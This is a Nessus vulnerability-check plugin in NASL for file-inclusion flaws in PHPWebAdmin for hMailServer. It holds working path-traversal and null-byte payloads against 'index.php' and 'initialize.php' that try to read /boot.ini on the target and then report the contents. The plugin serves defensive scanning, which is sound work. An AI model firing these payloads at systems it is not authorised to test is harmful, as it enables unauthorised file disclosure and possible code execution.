#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(34726);
  script_version("$Revision: 1.9 $");
script_cvs_date("$Date: 2015/09/24 23:21:19 $");
  script_osvdb_id(49636, 49637);

  script_xref(name:"EDB-ID", value:"7012");
  script_xref(name:"Secunia", value:"32597");

  script_name(english:"PHPWebAdmin for hMailServer Multiple File Inclusions");
  script_summary(english:"Tries to read a local file");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is susceptible
to at least one file include attack." );
 script_set_attribute(attribute:"description", value:
"The remote host is running PHPWebAdmin, a PHP-based administration
front-end for hMailServer. 

The version of PHPWebAdmin installed on the remote host reportedly
fails to sanitize user input to the 'page' parameter of the
'index.php' script and the 'hmail_config[includepath]' parameter of
the 'initialize.php' script before using it to include PHP code.  An
unauthenticated attacker may be able to leverage this issue to view
arbitrary files on the remote host or to execute arbitrary PHP code,
possibly taken from third-party hosts." );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2008/11/09");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2008-2015 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");
  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80, php: 1);


file = '/boot.ini';
file_pat = "^ *\[boot loader\]";
traversal = crap(data:"../", length:3*9) + '..';

if (thorough_tests) 
{
  exploits = make_list(
    string("/index.php?page=background/=", traversal, file, "%00"),
    string("/initialize.php?hmail_config[includepath]=", file, "%00")
  );
}
else 
{
  exploits = make_list(
    string("/index.php?page=background/=", traversal, file, "%00")
  );
}


# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/phpwebadmin", "/pwa", "/mailserver", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Make sure it's PHPWebAdmin.
  res = http_get_cache(item:string(dir, "/index.php"), port:port, exit_on_fail: 1);

  # If so...
  if (
    "<TITLE>PHPWebAdmin</TITLE>" >< res &&
    'hmailserver.com/documentation/">documentation</a>' >< res
  )
  {
    # Try each exploit.
    foreach exploit (exploits)
    {
      url = string(dir, exploit);

      res = http_send_recv3(port:port, item:url, method:"GET", exit_on_fail: 1);

      # There's a problem if...
      body = res[2];
      if (
       # we get the file we're looking for or...
        egrep(pattern:file_pat, string:body) ||
        # we get an error because magic_quotes was enabled or...
        string(file, "/0functions.php") >< body ||
        # we get an error claiming the file doesn't exist or...
        string("require_once(", file, "): failed to open stream: No such file") >< body ||
        string("require_once(", file, ") [function.include]: failed to open stream: No such file") >< body ||
        string("require_once(", file, ") [<a href='function.include'>function.include</a>]: failed to open stream: No such file") >< body ||
        # we get an error about open_basedir restriction.
        string("require_once(", file, ") [function.include]: failed to open stream: Operation not permitted") >< body ||
        string("require_once(", file, ") [<a href='function.include'>function.include</a>]: failed to open stream: Operation not permitted") >< body ||
        string("open_basedir restriction in effect. File(", file) >< body
      )
      {
        if (report_verbosity && egrep(pattern:file_pat, string:body))
        {
          file = str_replace(find:'/', replace:'\\', string:file);

          report = string(
            "\n",
            "Nessus was able to exploit the issue to retrieve the contents of\n",
            "'", file, "' on the remote host using the following URL :\n",
            "\n",
            "  ", build_url(port:port, qs:url), "\n"
          );
          if (report_verbosity > 1)
          {
            output = body;
            if ("<br " >< output) output = output - strstr(output, "<br ");
            if (!egrep(pattern:file_pat, string:output)) output = body;

            report += string(
              "\n",
              "Here are the contents :\n",
              "\n",
              "  ", str_replace(find:'\n', replace:'\n  ', string:output), "\n"
            );
          }
          security_warning(port:port, extra:report);
        }
        else security_warning(port);

        exit(0);
      }
    }
  }
}
